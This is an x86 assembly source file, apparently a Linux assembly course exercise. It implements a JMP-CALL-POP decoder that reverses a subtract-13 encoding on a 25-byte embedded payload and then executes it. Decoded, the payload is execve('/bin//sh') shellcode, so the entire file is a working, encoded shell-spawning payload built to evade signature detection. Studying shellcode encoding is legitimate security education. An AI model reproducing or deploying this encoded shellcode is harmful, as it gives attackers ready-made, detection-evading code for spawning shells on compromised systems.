# Filename: decoder.nasm
# Author: SLAE-14209

global _start
section .text
_start:

  jmp short call_shellcode

decoder:
  pop esi                      ; pop address of the shellcode in ESI
  xor ecx, ecx                 ; zeroize ECX register
  mov cl, 25                   ; counter = 25 (length of the shellcode)
  
decode:
  cmp byte [esi], 0xD          ; compare if is possible to substract value 13
  jl max_reached               ; jump if less -> max_reached
  sub byte [esi], 0xD          ; substract value 13
  jmp short shellcode
  
max_reached:
  xor edx, edx                 ; zeroize EDX register
  mov dl, 0xD                  ; set 13 into EDX
  sub dl, byte [esi]           ; 13 - byte value of the shellcode
  xor ebx, ebx                 ; zeroize EBX register
  mov bl, 0xff                 ; 0xff = 255                 
  inc ebx                      ; = 256
  sub bx, dx                   ; 256 - (13 - byte value of the shellcode)
  mov byte [esi], bl           ; move bl into ESI

shellcode:
  inc esi                      ; move to next byte
  loop decode                  ; loop "decode"
  jmp short EncodedShellcode
  
call_shellcode:

  call decoder
  EncodedShellcode: db 0x3e,0xcd,0x5d,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b,0x96,0xf0,0x5d,0x96,0xef,0x60,0x96,0xee,0xbd,0x18,0xda,0x8d
